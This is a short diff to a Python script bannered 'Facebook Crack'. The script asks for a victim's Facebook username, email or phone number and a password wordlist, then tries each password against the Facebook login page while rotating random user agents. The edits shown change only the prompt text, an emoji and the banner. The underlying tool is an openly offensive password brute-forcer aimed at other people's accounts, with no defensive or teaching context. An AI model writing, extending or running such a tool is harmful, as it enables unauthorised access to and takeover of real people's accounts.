@@ -9,8 +9,7 @@ import random
 
 
 
-email = str(raw_input("Enter the Facebook Username : "))
-
+email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
 
 
 passwordlist = str(raw_input("Enter the wordlist name and path : "))
@@ -38,7 +37,7 @@ def main():
 	
 	
 def brute(password):
-	sys.stdout.write("\r[💣] Trying ..... {}\n".format(password))
+	sys.stdout.write("\r[💥] Trying ..... {}\n".format(password))
 	sys.stdout.flush()
 	br.addheaders = [('User-agent', random.choice(useragents))]
 	site = br.open(login)
@@ -68,11 +67,11 @@ def welcome():
         +=========================================+
         |..........   Facebook Crack   ...........|
         +-----------------------------------------+
-        |            #Author: Heavens             | 
+        |           #Author: Heavens              | 
         |	       Version 1.0                |
- 	|            @ Jackson_heavens_           |
+ 	|                                         |
         +=========================================+
-        |..........  Facebook Brute.   ...........|
+        |..........  Facebook Cracker  ...........|
         +-----------------------------------------+\n\n
 """
 	total = open(passwordlist,"r")
